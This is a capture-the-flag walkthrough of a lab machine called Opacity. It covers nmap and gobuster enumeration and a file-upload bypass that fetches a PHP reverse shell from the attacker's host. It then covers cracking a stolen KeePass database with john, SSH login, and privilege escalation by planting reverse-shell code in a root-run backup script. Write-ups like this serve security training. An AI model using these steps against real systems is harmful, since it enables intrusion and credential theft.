## Quick Nmap Scan
```ruby
  nmap -v 10.10.181.171
  Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 12:15 IST
  Initiating Ping Scan at 12:15
  Scanning 10.10.181.171 [2 ports]
  Completed Ping Scan at 12:15, 0.39s elapsed (1 total hosts)
  Initiating Parallel DNS resolution of 1 host. at 12:15
  Completed Parallel DNS resolution of 1 host. at 12:15, 0.00s elapsed
  Initiating Connect Scan at 12:15
  Scanning 10.10.181.171 [1000 ports]
  Discovered open port 80/tcp on 10.10.181.171
  Discovered open port 22/tcp on 10.10.181.171
  Discovered open port 445/tcp on 10.10.181.171
  Discovered open port 139/tcp on 10.10.181.171
  Increasing send delay for 10.10.181.171 from 0 to 5 due to 62 out of 205 dropped probes since last increase.
  Increasing send delay for 10.10.181.171 from 5 to 10 due to 11 out of 13 dropped probes since last increase.
  Increasing send delay for 10.10.181.171 from 10 to 20 due to max_successful_tryno increase to 4
  Completed Connect Scan at 12:16, 29.44s elapsed (1000 total ports)
  Nmap scan report for 10.10.181.171
  Host is up (0.39s latency).
  Not shown: 996 closed tcp ports (conn-refused)
  PORT    STATE SERVICE
  22/tcp  open  ssh
  80/tcp  open  http
  139/tcp open  netbios-ssn
  445/tcp open  microsoft-ds

  Read data files from: /usr/bin/../share/nmap
  Nmap done: 1 IP address (1 host up) scanned in 29.88 seconds
```

## Specific port 22, 80, 139, 445
```ruby
nmap -p22,80,139,445 -vv -sC -sV -A -oN specificPort.nmap -T4 10.10.181.171
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 12:18 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Initiating Ping Scan at 12:18
Scanning 10.10.181.171 [2 ports]
Completed Ping Scan at 12:18, 0.43s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:18
Completed Parallel DNS resolution of 1 host. at 12:18, 0.01s elapsed
Initiating Connect Scan at 12:18
Scanning 10.10.181.171 [4 ports]
Discovered open port 80/tcp on 10.10.181.171
Discovered open port 139/tcp on 10.10.181.171
Discovered open port 22/tcp on 10.10.181.171
Discovered open port 445/tcp on 10.10.181.171
Completed Connect Scan at 12:18, 0.40s elapsed (4 total ports)
Initiating Service scan at 12:18
Scanning 4 services on 10.10.181.171
Completed Service scan at 12:18, 12.21s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.181.171.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:18
Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 3 (2 waiting)
NSE Timing: About 99.46% done; ETC: 12:18 (0:00:00 remaining)
Completed NSE at 12:18, 12.11s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 1.54s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Nmap scan report for 10.10.181.171
Host is up, received syn-ack (0.41s latency).
Scanned at 2023-04-20 12:18:22 IST for 27s

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0fee2910d98e8c53e64de3670c6ebee3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa4rFv9bD2hlJ8EgxU6clOj6v7GMUIjfAr7fzckrKGPnvxQA3ikvRKouMMUiYThvvfM7gOORL5sicN3qHS8cmRsLFjQVGyNL6/nb+MyfUJlUYk4WGJYXekoP5CLhwGqH/yKDXzdm1g8LR6afYw8fSehE7FM9AvXMXqvj+/WoC209pWu/s5uy31nBDYYfRP8VG3YEJqMTBgYQIk1RD+Q6qZya1RQDnQx6qLy1jkbrgRU9mnfhizLVsqZyXuoEYdnpGn9ogXi5A0McDmJF3hh0p01+KF2/+GbKjJrGNylgYtU1/W+WAoFSPE41VF7NSXbDRba0WIH5RmS0MDDFTy9tbKB33sG9Ct6bHbpZCFnxBi3toM3oBKYVDfbpbDJr9/zEI1R9ToU7t+RH6V0zrljb/cONTQCANYxESHWVD+zH/yZGO4RwDCou/ytSYCrnjZ6jHjJ9TWVkRpVjR7VAV8BnsS6egCYBOJqybxW2moY86PJLBVkd6r7x4nm19yX4AQPm8=
|   256 9542cdfc712799392d0049ad1be4cf0e (ECDSA)
| ecdsa-sha2-istp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAqe7rEbmvlsedJwYaZCIdligUJewXWs8mOjEKjVrrY/28XqW/RMZ12+4wJRL3mTaVJ/ftI6Tu9uMbgHs21itQQ=
|   256 edfe9c94ca9c086ff25ca6cf4d3c8e5b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINQSFcnxA8EchrkX6O0RPMOjIUZyyyQT9fM4z4DdCZyA
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 8670/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 59307/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 36060/udp): CLEAN (Failed to receive data)
|   Check 4 (port 4411/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-04-20T06:48:39
|_  start_date: N/A
|_clock-skew: 1s
| nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   OPACITY<00>          Flags: <unique><active>
|   OPACITY<03>          Flags: <unique><active>
|   OPACITY<20>          Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
```
# Gobuster

```ruby
gobuster dir -u http://10.10.181.171 -o gobust.txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x txt,php -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.181.171
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2023/04/20 12:39:52 Starting gobuster in directory enumeration mode
===============================================================
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 848]              
/css                  (Status: 301) [Size: 312] [--> http://10.10.181.171/css/]
/index.php            (Status: 302) [Size: 0] [--> login.php]                  
/server-status        (Status: 403) [Size: 278]                                
/cloud                (Status: 301) [Size: 314] [--> http://10.10.181.171/cloud/]

```

# Penetrate

### /cloud

* It has the image upload option, It might be the port to get in

1) I used `pwncat-cs -lp 4441` for listen on 4441
2) I used `python3 -m http.server`
3) created Revshell.php from pentestmonkey
4) uploaded by my tun0 address ```html http://tun0:8000/shell.php#.jpg```
5) Open the link and than boom 
```ruby 
pwncat-cs -lp 4441
[13:45:57] Welcome to pwncat 🐈!                                                                                                                                               __main__.py:164
[13:47:19] received connection from 10.10.181.171:54512                                                                                                                             bind.py:84
[13:47:29] 10.10.181.171:54512: registered new host w/ db                                                                                                                       manager.py:957

(local) pwncat$
(local) pwncat$                                                                                                                                                                               
(remote) www-data@opacity:/var/www/html/cloud/images$
```

## In /opt dir
* their is file called dataset.kdbx

* I downloaded by using download in pwncat

```ruby
(local) pwncat$ download /opt/dataset.kdbx
/opt/dataset.kdbx ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 1.6/1.6 KB • ? • 0:00:00
[14:01:39] downloaded 1.57KiB in 2.14 seconds                                                                                                                                   download.py:71
(local) pwncat$

```
## It's time to crack with john
`keepass2john dataset.kdbx > hash.txt`

```ruby
john hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 12 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 4 candidates buffered for the current salt, minimum 12 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 12 needed for performance.
Warning: Only 11 candidates buffered for the current salt, minimum 12 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 12 needed for performance.
Warning: Only 9 candidates buffered for the current salt, minimum 12 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 12 needed for performance.
Warning: Only 6 candidates buffered for the current salt, minimum 12 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
74*****63        (dataset)
1g 0:00:00:07 DONE 2/3 (2023-04-20 14:05) 0.1315g/s 437.3p/s 437.3c/s 437.3C/s rosita..sweetness
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Open the file

`$ apt search keepass`
there is lot of result
`$ apt install keepassx`

execute the `keepassx` and put the password to enter and get the credentials


* by using the credential login via ssh as sysadmin

* In the home directory their is scripts directory

```bash
~/scripts/lib/backup.inc.php
```

I copy past the shell code from pentestMonkey in `~/scripts/lib/backup.inc.php` and  get the connection on pwncat


### boom I got the root

